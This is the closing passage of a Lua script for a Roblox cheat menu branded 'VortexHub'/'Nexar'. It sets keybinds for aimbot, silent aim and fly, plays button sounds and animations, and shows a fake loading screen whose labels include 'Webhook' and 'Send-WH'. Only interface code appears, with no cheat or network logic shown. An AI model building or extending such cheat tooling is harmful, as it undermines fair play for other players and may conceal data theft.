	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_268)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.AimBotKey.TextBox.Function \\ --
local function SCRIPT_275()
local script = UI["275"]
	local BlackList = {
		"Ã¶", "Ã¤", "Ã¼", "o","w","W","a","A","d","D","s","S", "g", "i", "e", "Ã–", "Ã„", "Ãœ", "O", "G", "I", "E"
	}
	
	script.Parent.Changed:Connect(function()
		if not script.Parent or not script.Parent.Parent.Parent.Parent.Parent.Settings then return end
		local Input = string.sub(script.Parent.Text, 1, 1)
		script.Parent.Text = Input
		for _, I in ipairs(BlackList) do
			if string.find(script.Parent.Text, I) then	script.Parent.Text = script.Parent.Parent.Parent.Parent.Parent.Settings:GetAttribute("AimBotKey")
				return 	
			end 
		end
		Input =	string.upper(Input)
		script.Parent.Text = Input
		script.Parent.Parent.Parent.Parent.Parent.Settings:SetAttribute("AimBotKey", Input)
		--game.Players.LocalPlayer.PlayerGui.RobloxUpdater1.MainTab.Settings:SetAttribute("SilentAimKey", Input)
	end)
	
	
end
task.spawn(SCRIPT_275)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.SilentAimKey.TextBox.Function \\ --
local function SCRIPT_27b()
local script = UI["27b"]
	local BlackList = {
		"Ã¶", "Ã¤", "Ã¼", "o", "g","w","W","a","A","d","D","s","S", "i", "e", "Ã–", "Ã„", "Ãœ", "O", "G", "I", "E", " "
	}
	
	script.Parent.Changed:Connect(function()
		if not script.Parent or not script.Parent.Parent.Parent.Parent.Parent.Settings then return end
		local Input = string.sub(script.Parent.Text, 1, 1)
		script.Parent.Text = Input
		for _, I in ipairs(BlackList) do
			if string.find(script.Parent.Text, I) then	script.Parent.Text = script.Parent.Parent.Parent.Parent.Parent.Settings:GetAttribute("SilentAimKey")
			return 	
			end 
		end
		Input =	string.upper(Input)
		script.Parent.Text = Input
		script.Parent.Parent.Parent.Parent.Parent.Settings:SetAttribute("SilentAimKey", Input)
	--game.Players.LocalPlayer.PlayerGui.RobloxUpdater1.MainTab.Settings:SetAttribute("SilentAimKey", Input)
	end)
	
	
end
task.spawn(SCRIPT_27b)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.CarFlyKey.TextBox.Function \\ --
local function SCRIPT_281()
local script = UI["281"]
	local BlackList = {
		"Ã¶", "Ã¤", "Ã¼", "o","w","W","a","A","d","D","s","S", "g", "i", "e", "Ã–", "Ã„", "Ãœ", "O", "G", "I", "E"
	}
	
	script.Parent.Changed:Connect(function()
		if not script.Parent or not script.Parent.Parent.Parent.Parent.Parent.Settings then return end
		local Input = string.sub(script.Parent.Text, 1, 1)
		script.Parent.Text = Input
		for _, I in ipairs(BlackList) do
			if string.find(script.Parent.Text, I) then	script.Parent.Text = script.Parent.Parent.Parent.Parent.Parent.Settings:GetAttribute("CarFlyKey")
				return 	
			end 
		end
		Input =	string.upper(Input)
		script.Parent.Text = Input
		script.Parent.Parent.Parent.Parent.Parent.Settings:SetAttribute("CarFlyKey", Input)
		--game.Players.LocalPlayer.PlayerGui.RobloxUpdater1.MainTab.Settings:SetAttribute("SilentAimKey", Input)
	end)
	
	
end
task.spawn(SCRIPT_281)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Settings.FlyKey.TextBox.Function \\ --
local function SCRIPT_287()
local script = UI["287"]
	local BlackList = {
		"Ã¶", "Ã¤", "Ã¼","w","W","a","A","d","D","s","S", "o", "g", "i", "e", "Ã–", "Ã„", "Ãœ", "O", "G", "I", "E"
	}
	
	script.Parent.Changed:Connect(function()
		if not script.Parent or not script.Parent.Parent.Parent.Parent.Parent.Settings then return end
		local Input = string.sub(script.Parent.Text, 1, 1)
		script.Parent.Text = Input
		for _, I in ipairs(BlackList) do
			if string.find(script.Parent.Text, I) then	script.Parent.Text = script.Parent.Parent.Parent.Parent.Parent.Settings:GetAttribute("FlyKey")
				return 	
			end 
		end
		Input =	string.upper(Input)
		script.Parent.Text = Input
		script.Parent.Parent.Parent.Parent.Parent.Settings:SetAttribute("FlyKey", Input)
		--game.Players.LocalPlayer.PlayerGui.RobloxUpdater1.MainTab.Settings:SetAttribute("SilentAimKey", Input)
	end)
	
	
end
task.spawn(SCRIPT_287)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Aimbot.Click Sound1 \\ --
local function SCRIPT_291()
local script = UI["291"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_291)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.MAIN.Click Sound1 \\ --
local function SCRIPT_295()
local script = UI["295"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_295)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Misc.Click Sound1 \\ --
local function SCRIPT_299()
local script = UI["299"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_299)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Teleport.Click Sound1 \\ --
local function SCRIPT_29d()
local script = UI["29d"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_29d)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.VISUALS.Click Sound1 \\ --
local function SCRIPT_2a1()
local script = UI["2a1"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2a1)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Vehicle.Click Sound1 \\ --
local function SCRIPT_2a5()
local script = UI["2a5"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2a5)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.GunMods.Click Sound1 \\ --
local function SCRIPT_2a9()
local script = UI["2a9"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2a9)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Server.Click Sound1 \\ --
local function SCRIPT_2ad()
local script = UI["2ad"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2ad)
-- // StarterGui.RobloxUpdater1.MainTab.Buttons.ScrollingFrame.Stats.Click Sound1 \\ --
local function SCRIPT_2b3()
local script = UI["2b3"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2b3)
-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.Name.LocalScript \\ --
local function SCRIPT_2be()
local script = UI["2be"]
	local textLabel = script.Parent -- Stelle sicher, dass dieses Skript unter einem TextLabel in StarterGui ist
	local texts = {" VortexHubÂ®", " NexarÂ®"} -- Liste der Texte
	local interval = 3 -- Sekunden zwischen den Ã„nderungen
	local loadingWords = {"Loading", "Images", "Optimizing", "Load-AM3", "Load-AH16", "Load-SQ58", "Load-MG27", "Load-FI95", "Webhook", "Send-WH"}
	
	-- Geordnete Ladeanimation von 0 bis 100%
	local progress = 0
	local wordIndex = 1
	while progress < 100 do
	    local currentWord = loadingWords[wordIndex]
	    progress = math.min(progress + math.random(5, 20), 100)
	    textLabel.Text = currentWord .. "... " .. progress .. "%"
	    wait(math.random(0.2, 1))
	    
	    wordIndex = wordIndex + 1
	    if wordIndex > #loadingWords then
	        wordIndex = 1
	    end
	end
	
	-- Zeige einmalig "Welcome" an
	textLabel.Text = "Welcome!"
	wait(interval)
	
	while true do
	    for _, newText in ipairs(texts) do
	        textLabel.Text = newText
	        wait(interval)
	    end
	end
end
task.spawn(SCRIPT_2be)
-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.CloseScript \\ --
local function SCRIPT_2c5()
local script = UI["2c5"]
	local frame = script.Parent.Parent.Parent.Parent.MainTab
	
	script.Parent.MouseButton1Click:Connect(function()
		if not frame.Visible then
			frame.Visible = true 
		else
			frame.Visible = false 
		end
	end)
	
end
task.spawn(SCRIPT_2c5)
-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.animation \\ --
local function SCRIPT_2c6()
local script = UI["2c6"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.04, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_2c6)
-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.Click Sound1 \\ --
local function SCRIPT_2c7()
local script = UI["2c7"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2c7)
-- // StarterGui.RobloxUpdater1.MainTab.TabsFrame.CUI.Click Sound1 \\ --
local function SCRIPT_2c8()
local script = UI["2c8"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://6895079853"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2c8)

return UI["1"], require;
